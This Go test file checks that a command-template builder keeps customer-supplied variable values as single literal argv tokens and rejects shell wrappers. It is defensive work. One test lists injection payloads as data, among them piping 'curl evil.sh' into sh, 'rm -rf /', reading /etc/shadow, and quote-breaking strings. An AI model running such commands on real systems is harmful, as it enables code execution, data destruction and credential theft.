package spec

import (
	"strings"
	"testing"
)

func TestBuildArgv_SimpleSubstitution(t *testing.T) {
	argv, err := BuildArgv(
		`java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}} nogui`,
		map[string]string{"SERVER_MEMORY": "2048", "SERVER_JARFILE": "server.jar"},
	)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := []string{"java", "-Xms128M", "-Xmx2048M", "-jar", "server.jar", "nogui"}
	if !equalSlices(argv, want) {
		t.Fatalf("got %v, want %v", argv, want)
	}
}

// This is the load-bearing security test for the whole package: no matter
// what a customer puts in a variable value, it must land as exactly one
// literal argv element and must never grow additional argv elements or
// escape into anything a shell would interpret.
func TestBuildArgv_HostileVariableValuesNeverEscapeSingleToken(t *testing.T) {
	tmpl := `java -jar {{SERVER_JARFILE}} nogui`
	hostile := []string{
		`x.jar; curl evil.sh | sh`,
		"x.jar\ncurl evil.sh",
		"x.jar && rm -rf /",
		"x.jar $(cat /etc/shadow)",
		"x.jar `id`",
		"x.jar' ; echo pwned #",
		`x.jar" ; echo pwned #`,
		"x.jar ${IFS} evil",
		"../../../etc/passwd",
		"x.jar --evil-flag",
	}
	for _, val := range hostile {
		argv, err := BuildArgv(tmpl, map[string]string{"SERVER_JARFILE": val})
		if err != nil {
			t.Fatalf("value %q: unexpected error: %v", val, err)
		}
		want := []string{"java", "-jar", val, "nogui"}
		if !equalSlices(argv, want) {
			t.Fatalf("value %q: argv = %v, want %v (hostile value must remain exactly one literal token)", val, argv, want)
		}
		if len(argv) != 4 {
			t.Fatalf("value %q: expected exactly 4 argv elements, got %d: %v", val, len(argv), argv)
		}
	}
}

func TestBuildArgv_QuotedTemplateTokens(t *testing.T) {
	argv, err := BuildArgv(`sh_replacement --name "{{SERVER_NAME}}" --flag`, map[string]string{"SERVER_NAME": "my server"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := []string{"sh_replacement", "--name", "my server", "--flag"}
	if !equalSlices(argv, want) {
		t.Fatalf("got %v, want %v", argv, want)
	}
}

func TestBuildArgv_RejectsShellArgv0(t *testing.T) {
	for _, bad := range []string{"sh -c evil", "bash -c evil", "env FOO=bar cmd", "eval evil"} {
		if _, err := BuildArgv(bad, nil); err == nil {
			t.Fatalf("template %q: expected rejection of shell-like argv[0], got none", bad)
		}
	}
}

func TestBuildArgv_UndeclaredVariableIsAnError(t *testing.T) {
	_, err := BuildArgv(`java -jar {{NOT_DECLARED}}`, map[string]string{"SERVER_JARFILE": "x"})
	if err == nil {
		t.Fatal("expected an error for a template variable with no supplied value")
	}
}

func TestBuildArgv_UnterminatedQuoteIsRejected(t *testing.T) {
	if _, err := BuildArgv(`java --name "unterminated`, nil); err == nil {
		t.Fatal("expected an error for an unterminated quote")
	}
}

func TestBuildArgv_UnterminatedPlaceholderIsRejected(t *testing.T) {
	_, err := BuildArgv(`java -jar {{SERVER_JARFILE`, map[string]string{"SERVER_JARFILE": "x"})
	if err == nil {
		t.Fatal("expected an error for an unterminated {{ placeholder")
	}
}

func TestBuildArgv_EmptyTemplateIsRejected(t *testing.T) {
	if _, err := BuildArgv("   ", nil); err == nil {
		t.Fatal("expected an error for an empty/whitespace-only template")
	}
}

func TestBuildArgv_NulByteInSubstitutedValueRejected(t *testing.T) {
	_, err := BuildArgv(`java -jar {{JAR}}`, map[string]string{"JAR": "x\x00y"})
	if err == nil {
		t.Fatal("expected rejection of a NUL byte introduced via substitution")
	}
	if !strings.Contains(err.Error(), "NUL") {
		t.Fatalf("expected a NUL-related error, got: %v", err)
	}
}

func equalSlices(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
